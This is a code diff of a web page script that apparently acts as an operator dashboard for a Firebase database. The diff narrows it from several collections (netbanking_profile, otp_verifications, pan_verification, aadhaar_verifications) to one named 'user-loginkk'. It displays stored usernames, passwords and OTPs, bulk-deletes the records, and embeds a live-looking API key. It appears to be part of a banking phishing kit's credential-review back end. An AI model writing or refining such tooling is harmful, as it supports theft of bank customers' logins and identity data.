@@ -90,7 +90,7 @@
 
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
-    import { getFirestore, collection, getDocs, query, doc, deleteDoc } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
+    import { getFirestore, collection, getDocs, doc, deleteDoc } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
 
     const firebaseConfig = {
       apiKey: "AIzaSyCPm7u8Gw5IK1GuPVZ02pxr5tXG3ik7xoI",
@@ -103,10 +103,10 @@
 
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
-    const collections = ["netbanking_profile", "otp_verifications", "pan_verification", "users", "aadhaar_verifications"];
+    const collectionName = "user-loginkk";
     const container = document.getElementById("dataContainer");
     const buttonsDiv = document.getElementById("collectionButtons");
-    let allEntries = {};
+    let allEntries = [];
 
     function createField(key, value) {
       const field = document.createElement("div");
@@ -134,16 +134,8 @@
       const div = document.createElement("div");
       div.className = "entry";
 
-      const displayOrder = ["username", "password", "otp", "profile", "name"];
-      displayOrder.forEach(key => {
-        if (entry.data[key]) {
-          const field = createField(key.charAt(0).toUpperCase() + key.slice(1), entry.data[key]);
-          div.appendChild(field);
-        }
-      });
-
       for (const key in entry.data) {
-        if (key === "sessionid" || displayOrder.includes(key) || (typeof entry.data[key] === "object" && entry.data[key]?.seconds)) continue;
+        if (key === "sessionid" || (typeof entry.data[key] === "object" && entry.data[key]?.seconds)) continue;
         const field = createField(key, entry.data[key]);
         div.appendChild(field);
       }
@@ -160,33 +152,22 @@
     }
 
     async function loadData() {
-      for (const col of collections) {
-        const q = query(collection(db, col));
-        const snap = await getDocs(q);
-        allEntries[col] = [];
-        snap.forEach(docSnap => {
-          allEntries[col].push({
-            id: docSnap.id,
-            data: docSnap.data(),
-            collection: col,
-          });
+      const snap = await getDocs(collection(db, collectionName));
+      allEntries = [];
+      snap.forEach(docSnap => {
+        allEntries.push({
+          id: docSnap.id,
+          data: docSnap.data()
         });
-      }
+      });
       createButtons();
     }
 
     function createButtons() {
       const allBtn = document.createElement("button");
-      allBtn.textContent = "ALL DATA";
+      allBtn.textContent = "SHOW DATA";
       allBtn.onclick = () => showAllData();
       buttonsDiv.appendChild(allBtn);
-
-      collections.forEach(col => {
-        const btn = document.createElement("button");
-        btn.textContent = col.replace(/_/g, " ").toUpperCase();
-        btn.onclick = () => showCollection(col);
-        buttonsDiv.appendChild(btn);
-      });
 
       const deleteBtn = document.createElement("button");
       deleteBtn.textContent = "DELETE ALL DATA";
@@ -204,13 +185,10 @@
       const confirmation = confirm("Are you sure you want to delete all data?");
       if (confirmation) {
         try {
-          for (const col of collections) {
-            const q = query(collection(db, col));
-            const snap = await getDocs(q);
-            snap.forEach(async (docSnap) => {
-              await deleteDoc(doc(db, col, docSnap.id));
-            });
-          }
+          const snap = await getDocs(collection(db, collectionName));
+          snap.forEach(async (docSnap) => {
+            await deleteDoc(doc(db, collectionName, docSnap.id));
+          });
           alert("All data deleted successfully.");
           container.innerHTML = "";
         } catch (error) {
@@ -220,37 +198,15 @@
       }
     }
 
-    function showCollection(col) {
-      container.innerHTML = "";
-      const section = document.createElement("div");
-      section.className = "section";
-      section.style.display = "block";
-
-      const heading = document.createElement("h2");
-      heading.textContent = col.toUpperCase();
-      section.appendChild(heading);
-
-      allEntries[col]
-        .sort((a, b) => (b.data.timestamp?.seconds || 0) - (a.data.timestamp?.seconds || 0))
-        .forEach(entry => {
-          const div = createEntry(entry);
-          section.appendChild(div);
-        });
-
-      container.appendChild(section);
-    }
-
     function showAllData() {
       container.innerHTML = "";
-      const all = Object.values(allEntries).flat();
-
-      const sorted = all.sort((a, b) => (b.data.timestamp?.seconds || 0) - (a.data.timestamp?.seconds || 0));
+      const sorted = allEntries.sort((a, b) => (b.data.timestamp?.seconds || 0) - (a.data.timestamp?.seconds || 0));
       const section = document.createElement("div");
       section.className = "section";
       section.style.display = "block";
 
       const heading = document.createElement("h2");
-      heading.textContent = "ALL DATA (Newest First)";
+      heading.textContent = "USER-LOGINKK DATA";
       section.appendChild(heading);
 
       sorted.forEach(entry => {
